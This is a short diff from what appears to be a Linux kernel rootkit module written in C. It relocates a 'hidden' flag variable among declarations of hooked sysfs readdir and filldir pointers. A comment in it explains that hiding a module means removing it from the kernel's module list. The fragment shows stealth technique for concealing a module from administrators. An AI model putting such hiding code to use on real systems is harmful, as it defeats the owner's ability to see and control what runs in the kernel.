@@ -16,17 +16,13 @@ typedef int (*fun_int_file_dirent_filldir_t)(struct file *, void*, filldir_t);
 fun_int_file_dirent_filldir_t original_sysfs_readdir;
 filldir_t original_sysfs_filldir;
 
-
-
-
-int hidden = 0;
-
 struct list_head tos;
 
 // for convenience, I'm using the following notations for fun pointers:
 // fun_<return type>_<arg1>_<arg2>_<arg3>_...
 typedef int (*fun_int_void)(void);
 
+int hidden = 0;
 
 /*
  * Hiding a module is basically just removing it from the list of modules
